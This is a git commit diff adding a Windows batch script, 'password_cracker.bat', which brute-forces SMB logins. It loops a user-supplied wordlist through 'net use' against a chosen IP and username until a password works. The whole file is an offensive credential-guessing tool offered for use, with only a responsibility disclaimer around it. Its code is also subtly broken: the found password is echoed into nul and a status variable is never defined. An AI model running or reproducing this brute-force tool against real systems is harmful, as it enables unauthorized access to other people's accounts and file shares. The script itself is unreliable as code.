3fa926b40d2a28666497cd4321b0c36959626dcd
DellUserVS <rounakk2011@gmail.com>
2024-05-06 21:00:21 +0530

    Published raw folder to github

---
+++ main/password_cracker.bat
@@ -0,0 +1,34 @@
+@echo off
+title SMB Bruteforce
+color A
+echo.
+
+echo This password cracker was made by @DellUserVS. Please use this software at your own risk. We are not responsible for any loss.
+
+echo.
+
+set /p ip="Enter IP Address: "
+set /p user="Enter Username: "
+set /p wordlist="Enter Password list: "
+
+set /a count=0
+
+for /f %%a in (%wordlist%) do (
+	set pass=%%a
+	set /a count += 1
+	call :attempt
+)
+
+echo Password Not Found :(
+pause
+exit
+
+:success
+echo Password Found: %pass% >nul 2>&1
+pause
+exit
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT_NO: %count%] [ATTEMPTED: %pass%] [ATTEMPT_STATUS: %FAILED%]
+if %errorlevel% EQU 0 goto success
